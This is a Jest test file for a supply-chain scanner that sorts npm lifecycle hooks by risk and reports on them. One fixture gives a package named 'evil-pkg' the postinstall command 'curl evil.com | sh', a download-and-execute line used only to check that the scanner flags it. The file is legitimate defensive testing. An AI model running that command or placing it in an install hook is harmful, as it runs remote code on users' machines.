import {
  classifyLifecycleRisk,
  extractLifecycleScripts,
  analyzeLifecycle,
  formatLifecycleReport,
} from './lifecycle';
import { Dependency } from '../parser';

const makeDep = (name: string, version: string, scripts?: Record<string, string>): Dependency & { scripts?: Record<string, string> } => ({
  name,
  version,
  scripts,
} as any);

describe('classifyLifecycleRisk', () => {
  it('returns none for empty scripts', () => {
    expect(classifyLifecycleRisk([])).toBe('none');
  });

  it('returns high for postinstall', () => {
    expect(classifyLifecycleRisk(['postinstall'])).toBe('high');
  });

  it('returns high for preinstall', () => {
    expect(classifyLifecycleRisk(['preinstall'])).toBe('high');
  });

  it('returns medium for postuninstall', () => {
    expect(classifyLifecycleRisk(['postuninstall'])).toBe('medium');
  });

  it('returns high when mixed high and medium hooks are present', () => {
    expect(classifyLifecycleRisk(['postuninstall', 'preinstall'])).toBe('high');
  });
});

describe('extractLifecycleScripts', () => {
  it('returns empty for undefined scripts', () => {
    expect(extractLifecycleScripts(undefined)).toEqual([]);
  });

  it('extracts only lifecycle hooks', () => {
    const scripts = { build: 'tsc', postinstall: 'node setup.js', test: 'jest' };
    expect(extractLifecycleScripts(scripts)).toEqual(['postinstall']);
  });

  it('extracts multiple hooks', () => {
    const scripts = { preinstall: 'check.sh', postinstall: 'setup.sh' };
    const result = extractLifecycleScripts(scripts);
    expect(result).toContain('preinstall');
    expect(result).toContain('postinstall');
  });

  it('returns empty for scripts with no lifecycle hooks', () => {
    const scripts = { build: 'tsc', test: 'jest', lint: 'eslint .' };
    expect(extractLifecycleScripts(scripts)).toEqual([]);
  });
});

describe('analyzeLifecycle', () => {
  it('returns empty report for deps without hooks', () => {
    const deps = [makeDep('lodash', '4.17.21')];
    const report = analyzeLifecycle(deps);
    expect(report.totalWithHooks).toBe(0);
    expect(report.highRiskCount).toBe(0);
  });

  it('detects high risk package', () => {
    const deps = [makeDep('evil-pkg', '1.0.0', { postinstall: 'curl evil.com | sh' })];
    const report = analyzeLifecycle(deps);
    expect(report.totalWithHooks).toBe(1);
    expect(report.highRiskCount).toBe(1);
    expect(report.entries[0].risk).toBe('high');
  });

  it('sorts high risk before medium', () => {
    const deps = [
      makeDep('pkg-a', '1.0.0', { postuninstall: 'cleanup.sh' }),
      makeDep('pkg-b', '1.0.0', { postinstall: 'setup.sh' }),
    ];
    const report = analyzeLifecycle(deps);
    expect(report.entries[0].name).toBe('pkg-b');
  });

  it('handles empty dependency list', () => {
    const report = analyzeLifecycle([]);
    expect(report.totalWithHooks).toBe(0);
    expect(report.highRiskCount).toBe(0);
    expect(report.entries).toEqual([]);
  });
});

describe('formatLifecycleReport', () => {
  it('returns no-hooks message for empty report', () => {
    const report = { entries: [], totalWithHooks: 0, highRiskCount: 0 };
    expect(formatLifecycleReport(report)).toContain('No packages');
  });

  it('includes package name and risk level', () => {
    const deps = [makeDep('risky', '2.0.0', { postinstall: 'run.sh' })];
    const report = analyzeLifecycle(deps);
    const output = formatLifecycleReport(report);
    expect(output).toContain('risky');
    expect(output).toContain('HIGH');
  });
});
